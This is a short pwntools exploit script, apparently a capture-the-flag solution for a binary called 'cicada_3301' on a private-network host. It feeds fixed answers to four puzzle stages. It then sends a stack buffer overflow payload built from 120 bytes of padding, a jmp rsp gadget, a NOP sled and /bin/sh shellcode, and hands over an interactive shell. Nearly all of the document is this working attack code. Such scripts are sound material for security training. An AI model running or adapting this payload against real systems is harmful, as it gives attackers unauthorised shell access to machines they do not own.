#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'cicada_3301')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
    	return remote(args.HOST or '192.168.1.164', int(args.PORT or 15030))
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

# Solve Stages 1-4
io.recvuntil(b'>_ ')
io.sendline(b'2')       # Stage 1
io.recvuntil(b'>_ ')
io.sendline(b'5')       # Stage 2
io.recvuntil(b'>_ ')
io.sendline(b'apple')  # Stage 3
io.recvuntil(b'>_ ')
io.sendline(b'level')   # Stage 4
# Exploit Stage 5
io.recvuntil(b'2 + 2 = ?\n>_ ')  # Corrected line (no missing quotes)
shellcode = asm(shellcraft.sh())
offset = 120
jmp_rsp = 0x4011ca
payload = flat(
    b'A' * offset,
    p64(jmp_rsp),
    asm('nop') * 16,
    shellcode
)
io.sendline(payload)

io.interactive()

